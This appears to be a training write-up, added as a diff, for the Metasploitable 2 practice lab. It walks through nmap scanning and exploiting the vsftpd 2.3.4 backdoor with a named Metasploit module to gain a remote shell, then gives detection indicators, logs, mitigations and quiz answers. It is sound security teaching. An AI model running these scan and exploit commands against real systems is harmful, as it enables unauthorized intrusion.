@@ -1,0 +1,422 @@
+Metasploitable Walkthrough
+- A beginner penetration testing lab demonstrating how attackers compromise a vulnerable Linux system using common exploitation techniques.
+
+==================================================
+Attack Metadata
+==================================================
+
+Category:
+Practice Labs → Vulnerable System Exploitation
+
+Attack Stage:
+Reconnaissance
+Discovery
+Initial Access
+Execution
+
+Difficulty:
+Beginner
+
+Stealth Level:
+Low
+
+Requires Authentication:
+No
+
+Tools Used:
+Nmap
+Metasploit Framework
+Netcat
+Searchsploit
+
+
+==================================================
+1. Overview
+==================================================
+Metasploitable is a deliberately vulnerable Linux virtual machine used for penetration testing practice.
+
+It contains multiple insecure services and misconfigurations designed to simulate real-world vulnerabilities.
+
+The goal of this walkthrough is to demonstrate a complete attack chain:
+
+- reconnaissance
+- service enumeration
+- vulnerability discovery
+- exploitation
+- remote shell access
+
+Metasploitable is commonly used in:
+
+- beginner penetration testing labs
+- security training environments
+- capture-the-flag exercises
+
+
+==================================================
+2. Lab Environment
+==================================================
+Example setup:
+
+Attacker Machine
+- Kali Linux
+
+Target Machine
+- Metasploitable 2
+
+Network Example:
+
+Attacker
+192.168.56.101
+
+Target
+192.168.56.102
+
+Both machines are connected to the same virtual network.
+
+
+==================================================
+3. Tools Required
+==================================================
+
+Nmap
+Used for port scanning and service enumeration.
+
+Metasploit Framework
+Used to exploit vulnerable services.
+
+Netcat
+Used to interact with remote services.
+
+Searchsploit
+Used to identify public exploits.
+
+
+==================================================
+4. Attack Workflow
+==================================================
+
+Network Discovery
+        ↓
+Port Scanning
+        ↓
+Service Enumeration
+        ↓
+Identify Vulnerable Service
+        ↓
+Exploit Service
+        ↓
+Gain Remote Shell
+
+
+==================================================
+5. Step-by-Step Execution
+==================================================
+Step 1 — Identify Target Host
+
+Example command:
+
+nmap -sn 192.168.56.0/24
+
+This reveals the IP address of the Metasploitable machine.
+
+
+Step 2 — Perform Port Scan
+
+Example command:
+
+nmap -sV 192.168.56.102
+
+Example output may reveal services such as:
+
+21/tcp  ftp
+22/tcp  ssh
+23/tcp  telnet
+80/tcp  http
+139/tcp smb
+
+
+Step 3 — Identify Vulnerable Service
+
+One common vulnerable service in Metasploitable is the **vsftpd 2.3.4 backdoor vulnerability**.
+
+
+Step 4 — Launch Metasploit
+
+Example command:
+
+msfconsole
+
+
+Step 5 — Search for Exploit
+
+Example command:
+
+search vsftpd
+
+
+Step 6 — Configure Exploit
+
+Example commands:
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.102
+run
+
+
+Step 7 — Gain Remote Shell
+
+If successful, the attacker receives a command shell on the target system.
+
+
+==================================================
+6. Example Attack Scenario
+==================================================
+Network Discovery
+
+The attacker identifies a vulnerable host.
+
+
+Service Enumeration
+
+A vulnerable FTP service is discovered.
+
+
+Exploit Selection
+
+Metasploit identifies the vsftpd backdoor exploit.
+
+
+Remote Access
+
+The attacker gains shell access to the system.
+
+
+System Control
+
+The attacker can execute commands on the compromised machine.
+
+
+==================================================
+7. Expected Results
+==================================================
+Successful exploitation of Metasploitable demonstrates:
+
+- vulnerability discovery
+- exploitation of insecure services
+- remote command execution
+- system compromise
+
+This lab simulates real-world exploitation scenarios.
+
+
+==================================================
+8. Defensive Considerations
+==================================================
+Organizations can prevent similar attacks by implementing several security measures.
+
+Patch Management
+
+Regularly update software and services.
+
+Vulnerability Scanning
+
+Identify vulnerable services before attackers do.
+
+Service Hardening
+
+Disable unnecessary services.
+
+Network Monitoring
+
+Detect scanning and exploitation attempts.
+
+Security Awareness
+
+Ensure administrators understand secure configuration practices.
+
+
+==================================================
+9. MITRE ATT&CK Mapping
+==================================================
+
+Technique:
+T1046 — Network Service Discovery
+
+Technique:
+T1059 — Command and Scripting Interpreter
+
+Technique:
+T1190 — Exploit Public-Facing Application
+
+Technique:
+T1210 — Exploitation of Remote Services
+
+Technique:
+T1059.004 — Unix Shell
+
+
+==================================================
+10. Blue Team Detection
+==================================================
+Security teams can detect this type of attack through network monitoring, vulnerability scanning alerts, and abnormal service behavior.
+
+Common indicators include:
+
+- aggressive port scanning activity
+- connection attempts to multiple services in a short time period
+- exploitation signatures targeting vulnerable services
+- unexpected command execution on Linux servers
+
+Indicators may also include:
+
+- suspicious FTP activity
+- unusual shell processes spawned by network services
+- outbound connections from compromised services.
+
+
+==================================================
+11. Relevant Logs
+==================================================
+
+Linux System Logs
+
+/var/log/auth.log  
+Authentication events.
+
+/var/log/syslog  
+System activity and service events.
+
+
+FTP Logs
+
+Logs from FTP services such as vsftpd may show unusual connection behavior.
+
+
+Network Logs
+
+Firewall logs may show scanning attempts across multiple ports.
+
+
+IDS / IPS Logs
+
+Alerts for:
+
+- port scanning
+- exploit signatures
+- abnormal FTP commands
+
+
+==================================================
+12. Detection Tools
+==================================================
+
+Suricata
+
+Detect exploit attempts targeting vulnerable services.
+
+Snort
+
+Detect exploit signatures and suspicious network activity.
+
+Zeek
+
+Analyze network traffic and identify unusual service interactions.
+
+Splunk
+
+Aggregate logs from network devices and servers to detect attack patterns.
+
+Elastic Stack
+
+Search service logs and correlate suspicious events.
+
+Wazuh
+
+Detect suspicious service behavior and abnormal command execution.
+
+
+==================================================
+13. Mitigation Strategies
+==================================================
+
+Patch Management
+
+Ensure vulnerable services are updated or replaced.
+
+Disable Unnecessary Services
+
+Remove services that are not required.
+
+Implement Network Segmentation
+
+Restrict access to internal systems.
+
+Deploy Intrusion Detection Systems
+
+Detect scanning and exploitation attempts.
+
+Perform Regular Vulnerability Scanning
+
+Identify exploitable services before attackers do.
+
+Implement Host-Based Monitoring
+
+Detect abnormal shell processes or command execution.
+
+
+==================================================
+14. Blue Team Knowledge Base Cross-References
+==================================================
+
+Blue Team → Network Defense
+
+Blue Team → Log Analysis and Detection
+
+Blue Team → Threat Hunting
+
+Blue Team → Incident Response
+
+Blue Team → Detection Engineering
+
+
+==================================================
+15. Questions & Answers
+==================================================
+
+Question:
+What is Metasploitable?
+
+Answer:
+A deliberately vulnerable Linux virtual machine used for penetration testing practice.
+
+--------------------------------------------------
+
+Question:
+Which tool is used for service enumeration?
+
+Answer:
+Nmap.
+
+--------------------------------------------------
+
+Question:
+Which framework is commonly used to exploit Metasploitable?
+
+Answer:
+Metasploit Framework.
+
+--------------------------------------------------
+
+Question:
+Which service vulnerability is commonly exploited in Metasploitable?
+
+Answer:
+The vsftpd 2.3.4 backdoor vulnerability.
+
+--------------------------------------------------
+
+Question:
+What is the purpose of Metasploitable labs?
+
+Answer:
+To practice vulnerability discovery and exploitation techniques.
